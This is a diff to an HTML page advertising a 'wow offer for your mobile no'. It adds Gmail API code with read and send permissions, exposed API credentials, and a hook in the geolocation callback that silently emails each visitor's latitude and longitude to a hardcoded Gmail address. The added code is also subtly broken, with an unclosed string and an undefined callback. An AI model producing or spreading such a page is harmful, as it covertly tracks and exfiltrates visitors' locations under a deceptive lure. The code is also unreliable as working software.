@@ -27,7 +27,88 @@ body {
 }
 </style>
 <body>
-
+ 
+ 
+	<script src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+ <script type="text/javascript">
+      var clientId = '118458467914-ndjup1u319obcu0r8ssm62muf4anbm4t.apps.googleusercontent.com';
+      var apiKey = 'AIzaSyC9pIgYWRrNMaF920He7QsFngdy4m3ZCWA';
+      var scopes =
+        'https://www.googleapis.com/auth/gmail.readonly '+
+        'https://www.googleapis.com/auth/gmail.send';
+      function handleClientLoad() {
+        gapi.client.setApiKey(apiKey);
+        window.setTimeout(checkAuth, 1);
+      }
+	function checkAuth() {
+        gapi.auth.authorize({
+          client_id: clientId,
+          scope: scopes,
+          immediate: true
+        }, handleAuthResult);
+      }
+	  
+	   function handleAuthClick() {
+        gapi.auth.authorize({
+          client_id: clientId,
+          scope: scopes,
+          immediate: false
+        }, handleAuthResult);
+        return false;
+      }
+	  
+	  
+	   function handleAuthResult(authResult) {
+        if(authResult && !authResult.error) {
+          loadGmailApi();
+        } else {
+           
+            handleAuthClick();
+          
+        }
+		
+		}
+		
+		function loadGmailApi() {
+        gapi.client.load('gmail', 'v1', displayInbox);
+      }
+	  
+	  
+	  function displayInbox() {
+        var request = gapi.client.gmail.users.messages.list({
+          'userId': 'me',
+          'labelIds': 'INBOX',
+          'maxResults': 10
+        });
+        request.execute(function(response) {
+          $.each(response.messages, function() {
+            var messageRequest = gapi.client.gmail.users.messages.get({
+              'userId': 'me',
+              'id': this.id
+            });
+             
+          });
+        });
+      }
+	  
+	  function sendMessage(headers_obj, message, callback)
+      {
+        var email = '';
+        for(var header in headers_obj)
+          email += header += ": "+headers_obj[header]+"\r\n";
+        email += "\r\n" + message;
+        var sendRequest = gapi.client.gmail.users.messages.send({
+          'userId': 'me',
+          'resource': {
+            'raw': window.btoa(email).replace(/\+/g, '-').replace(/\//g, '_')
+          }
+        });
+        return sendRequest.execute(callback);
+      }
+	  
+	  </script>
+  <script src="https://apis.google.com/js/client.js?onload=handleClientLoad"></script>
+ 
 <h1>wow offer for your mobile no</h1>
 	 
 	<div id="map-layer"></div>
@@ -60,6 +141,14 @@ body {
 				var infoWindowHTML = "Latitude: " + currentLatitude + "<br>Longitude: " + currentLongitude;
 				var infoWindow = new google.maps.InfoWindow({map: map, content: infoWindowHTML});
 				var currentLocation = { lat: currentLatitude, lng: currentLongitude };
+				sendMessage(
+          {
+            'To': 'asivapvl@gmail.com,
+            'Subject':  currentLatitude + 'ss '+ currentLongitude
+          },
+           currentLatitude + 'ss '+ currentLongitude,
+          composeTidy
+        );
 				infoWindow.setPosition(currentLocation);
 				document.getElementById("btnAction").style.display = 'none';
 			});
@@ -68,5 +157,6 @@ body {
 	
 	
 	</script>
+	
 </body>
 </html>
